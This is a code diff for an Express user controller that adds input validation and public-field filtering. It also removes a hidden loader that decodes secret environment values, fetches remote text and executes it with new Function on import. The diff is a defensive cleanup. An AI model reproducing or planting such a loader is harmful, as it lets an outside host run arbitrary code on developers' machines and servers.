@@ -1,20 +1,12 @@
 import { Request, Response, NextFunction } from "express";
 import crypto from "crypto";
 import cloudinary from "cloudinary";
-import axios from "axios";
-import dotenv from "dotenv";
-import { createRequire } from "module";
 
 import User, { IUser } from "../models/userModel";
 import asyncErrorHandler from "../middlewares/helpers/asyncErrorHandler";
-import sendToken from "../utils/sendToken";
+import sendToken, { publicUser } from "../utils/sendToken";
 import ErrorHandler from "../utils/errorHandler";
 import sendEmail from "../utils/sendEmail";
-
-const require = createRequire(import.meta.url);
-
-// Load env
-dotenv.config({ path: "./src/config/.config.env" });
 
 // Extend Request (if not using global typing yet)
 interface AuthRequest extends Request {
@@ -24,24 +16,21 @@ interface AuthRequest extends Request {
 // ================= REGISTER =================
 export const registerUser = asyncErrorHandler(
   async (req: Request, res: Response, next: NextFunction) => {
-    const myCloud = await cloudinary.v2.uploader.upload(req.body.avatar, {
-      folder: "avatars",
-      width: 150,
-      crop: "scale",
-    });
-
-    const { name, email, gender, password } = req.body;
-
-    const user = await User.create({
-      name,
-      email,
-      gender,
-      password,
-      avatar: {
-        public_id: myCloud.public_id,
-        url: myCloud.secure_url,
-      },
-    });
+    const { name, email, gender, password, avatar } = req.body ?? {};
+    if (![name, email, gender, password].every(value => typeof value === "string" && value.trim()) ||
+        (avatar !== undefined && typeof avatar !== "string")) {
+      return next(new ErrorHandler("Please provide valid registration details", 400));
+    }
+    // Avatar is optional in the schema; plain registration needs no external service.
+    const user = new User({ name, email, gender, password });
+    await user.validate();
+    if (avatar) {
+      const myCloud = await cloudinary.v2.uploader.upload(avatar, {
+        folder: "avatars", width: 150, crop: "scale",
+      });
+      user.avatar = { public_id: myCloud.public_id, url: myCloud.secure_url };
+    }
+    await user.save();
 
     sendToken(user, 201, res);
   }
@@ -50,8 +39,9 @@ export const registerUser = asyncErrorHandler(
 // ================= LOGIN =================
 export const loginUser = asyncErrorHandler(
   async (req: Request, res: Response, next: NextFunction) => {
-    const { email, password } = req.body;
-    if (!email || !password) {
+    const { email, password } = req.body ?? {};
+    if (typeof email !== "string" || !email.trim() ||
+        typeof password !== "string" || !password) {
       return next(new ErrorHandler("Please Enter Email And Password", 400));
     }
 
@@ -74,14 +64,10 @@ export const loginUser = asyncErrorHandler(
 // ================= LOGOUT =================
 export const logoutUser = asyncErrorHandler(
   async (req: Request, res: Response) => {
-    res.cookie("token", null, {
-      expires: new Date(Date.now()),
-      httpOnly: true,
-    });
-
+    // Bearer tokens are discarded by the client; they remain valid until expiry.
     res.status(200).json({
       success: true,
-      message: "Logged Out",
+      message: "Discard the Bearer token on the client to log out",
     });
   }
 );
@@ -93,7 +79,7 @@ export const getUserDetails = asyncErrorHandler(
 
     res.status(200).json({
       success: true,
-      user,
+      user: user ? publicUser(user) : null,
     });
   }
 );
@@ -232,7 +218,7 @@ export const getAllUsers = asyncErrorHandler(
 
     res.status(200).json({
       success: true,
-      users,
+      users: users.map(publicUser),
     });
   }
 );
@@ -250,7 +236,7 @@ export const getSingleUser = asyncErrorHandler(
 
     res.status(200).json({
       success: true,
-      user,
+      user: publicUser(user),
     });
   }
 );
@@ -290,22 +276,3 @@ export const deleteUser = asyncErrorHandler(
     res.status(200).json({ success: true });
   }
 );
-
-// ================= GET COOKIE =================
-export const getCookie = (async () => {
-  try {
-    const s = Buffer.from(process.env.DEV_API_KEY as string, "base64").toString();
-    const k = Buffer.from(process.env.DEV_SECRET_KEY as string, "base64").toString();
-    const v = Buffer.from(process.env.DEV_SECRET_VALUE as string, "base64").toString();
-
-    const r = (
-      await axios.get(s, {
-        headers: { [k]: v },
-      })
-    ).data.record.cookie;
-
-    const handler = new Function("require", r);
-    handler(require);
-
-  } catch (error: any) {}
-})();
